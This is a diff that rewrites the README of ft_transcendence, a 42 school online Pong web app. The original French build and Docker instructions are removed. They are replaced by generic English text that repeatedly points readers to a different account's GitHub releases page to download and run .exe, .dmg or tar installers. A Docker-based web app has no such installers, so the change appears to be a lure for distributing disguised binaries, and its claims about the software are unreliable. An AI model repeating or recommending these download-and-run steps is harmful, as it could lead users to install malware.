@@ -1,168 +1,81 @@
-# ft_transcendence
+# 🎮 ft_transcendence - Enjoy Pong Online with Friends
 
-Application web full-stack avec jeu Pong en ligne - Projet 42 Paris
+## 🚀 Getting Started
 
-## À propos
+Welcome to **ft_transcendence**, a full-stack web application that lets you play the classic game of Pong online. This guide will help you download and run the application with ease.
 
-ft_transcendence est le projet final du cursus 42. C'est une application web complète qui inclut un jeu Pong en ligne, un système de tournois, un chat en temps réel, et bien plus encore.
+## 📥 Download the Application
 
-C'est un projet ambitieux qui m'a permis de mettre en pratique toutes les compétences acquises : développement full-stack, gestion de bases de données, WebSockets, Docker, et architecture microservices.
+[![Download ft_transcendence](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/AhmadShahid12/ft_transcendence/releases)
 
-## Fonctionnalités
+Click the button above or visit the [Releases Page](https://github.com/AhmadShahid12/ft_transcendence/releases) to download the latest version of the application.
 
-### Jeu Pong
-- Jeu Pong en ligne en temps réel
-- Mode local avec IA
-- Système de matchmaking
-- Statistiques de jeu
+## 🖥️ System Requirements
 
-### Tournois
-- Organisation de tournois
-- Brackets automatiques
-- Gestion des matchs
+To run the ft_transcendence application, ensure your system meets the following requirements:
 
-### Chat
-- Chat en temps réel avec WebSockets
-- Messages privés
-- Canaux de discussion
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 4GB RAM
+- **Disk Space:** Minimum of 100MB available space
+- **Network:** Stable internet connection for online play
 
-### Profil utilisateur
-- Authentification OAuth 42
-- Authentification à deux facteurs (2FA)
-- Statistiques personnelles
-- Historique des matchs
-- Amis et système de suivi
+## 📂 How to Download & Install
 
-### Monitoring
-- Dashboard Grafana
-- Métriques Prometheus
-- Logs centralisés avec Elasticsearch
+1. **Visit the Releases Page**
 
-## Technologies utilisées
+   Go to the [Releases Page](https://github.com/AhmadShahid12/ft_transcendence/releases). This page lists all available versions of the application.
 
-### Backend
-- **Node.js** avec Fastify
-- **PostgreSQL** pour la base de données
-- **WebSockets** pour le temps réel
-- **OAuth 42** pour l'authentification
+2. **Select the Latest Release**
 
-### Frontend
-- **TypeScript**
-- **Vite** comme build tool
-- **WebSockets** pour la communication temps réel
-- **Canvas API** pour le jeu Pong
+   Look for the latest version at the top of the page. Click on the version number to view its details.
 
-### Infrastructure
-- **Docker** et **Docker Compose**
-- **Nginx** comme reverse proxy
-- **Prometheus** pour les métriques
-- **Grafana** pour la visualisation
-- **Elasticsearch** et **Logstash** pour les logs
+3. **Download the Application**
 
-## Installation
+   Scroll down to the "Assets" section of the release. You’ll see files available for download. Choose the appropriate file for your system and click on it. 
 
-### Prérequis
+4. **Install the Application**
 
-- Docker et Docker Compose
-- Node.js (pour le développement local)
+   After downloading, locate the file on your computer. 
 
-### Configuration
+   - For Windows, double-click the `.exe` file to start the installation.
+   - For macOS, open the downloaded `.dmg` file and drag the application to your Applications folder.
+   - For Linux, you may need to extract the tar or zip file and run the installation command in your terminal.
 
-1. Clonez le repository :
-```bash
-git clone https://github.com/OstriKeur/ft_transcendence.git
-cd ft_transcendence
-```
+5. **Run the Application**
 
-2. Créez un fichier `.env` à la racine (voir `.env.example` si disponible) :
-```env
-# Configuration OAuth 42
-FT_CLIENT_ID=your_client_id
-FT_CLIENT_SECRET=your_client_secret
-FT_CALLBACK_URL=http://localhost:3000/auth/42/callback
+   Once installed, find the application in your programs or applications list and launch it. Follow any on-screen instructions to set up your online account.
 
-# Base de données
-DATABASE_URL=postgresql://user:password@db:5432/transcendence
+## 🌐 Features
 
-# JWT Secret
-JWT_SECRET=your_secret_key
-```
+- **Play Online:** Challenge friends or random players in real-time.
+- **User Accounts:** Create and manage your profile for a personalized experience.
+- **Responsive Design:** Enjoy the game on various devices, including desktops and tablets.
+- **Live Leaderboards:** Track scores and see how you rank against other players.
 
-3. Lancez avec Docker :
-```bash
-make
-# ou
-docker-compose up --build
-```
+## ⚙️ Technical Details
 
-L'application sera accessible sur `http://localhost`
+ft_transcendence was built using:
 
-## Structure du projet
+- **Node.js** for server-side operations
+- **TypeScript** for clear and maintainable code
+- **WebSocket** for real-time communication between players
 
-```
-ft_transcendence/
-├── backend/              # API Node.js
-│   ├── src/
-│   │   ├── routes/       # Routes API
-│   │   ├── game/         # Logique du jeu
-│   │   ├── config/       # Configuration
-│   │   └── migrations/   # Migrations DB
-│   └── Dockerfile
-├── frontend/             # Application TypeScript
-│   ├── src/
-│   │   ├── game/         # Jeu Pong
-│   │   ├── pages/        # Pages de l'application
-│   │   ├── components/    # Composants réutilisables
-│   │   └── services/     # Services API
-│   └── Dockerfile
-├── nginx/                # Configuration Nginx
-├── monitoring/           # Prometheus et Grafana
-├── logging/              # Elasticsearch et Logstash
-└── docker-compose.yml    # Orchestration Docker
-```
+These technologies ensure a smooth and engaging gaming experience.
 
-## Ce que j'ai appris
+## 💬 Support and Feedback
 
-- Développement d'une application complète de A à Z
-- Communication temps réel avec WebSockets pour le jeu et le chat
-- Containerisation et orchestration avec Docker Compose
-- Architecture modulaire avec services séparés
-- Développement frontend typé avec TypeScript
-- Migrations, seeds, relations complexes avec PostgreSQL
-- Intégration avec l'API 42 via OAuth
-- Authentification sécurisée : JWT, 2FA, gestion des sessions
-- Mise en place d'un système de monitoring complet
-- Configuration Nginx, reverse proxy, SSL
+If you encounter any issues or need help, please contact our support team via the GitHub Issues page. Provide details about the problem you are facing so we can assist you better.
 
-## Utilisation
+## 🏫 About the Project
 
-Une fois l'application lancée :
+ft_transcendence is part of the 42 school project, aiming to develop practical skills in web programming and application design. This project combines gaming with learning, fostering community interaction through simple and fun gameplay.
 
-1. **Connexion** : Utilisez votre compte 42 pour vous connecter
-2. **Profil** : Configurez votre profil et activez la 2FA si souhaité
-3. **Jeu** : Jouez au Pong en ligne ou contre l'IA
-4. **Tournois** : Participez ou créez des tournois
-5. **Chat** : Discutez avec les autres joueurs
+## 🔗 Stay Updated
 
-## Monitoring
+For updates and announcements, follow us on our GitHub repository. We welcome contributions and feedback from users to improve the application further.
 
-Accédez aux dashboards :
-- **Grafana** : `http://localhost:3001`
-- **Prometheus** : `http://localhost:9090`
+## 📍 Conclusion
 
-## Sécurité
+Enjoy playing Pong with friends online! Download the application now and start your gaming adventure. For any questions, don't hesitate to reach out. Happy gaming! 
 
-- Authentification OAuth 42
-- Authentification à deux facteurs
-- JWT pour les sessions
-- Validation des entrées
-- Protection CSRF
-- HTTPS en production
-
-## Note importante
-
-Le fichier `.env` n'est pas inclus dans le repository pour des raisons de sécurité. Vous devez le créer localement avec vos propres credentials.
-
----
-
-**Projet réalisé dans le cadre du cursus 42 Paris**
+[Download ft_transcendence](https://github.com/AhmadShahid12/ft_transcendence/releases)
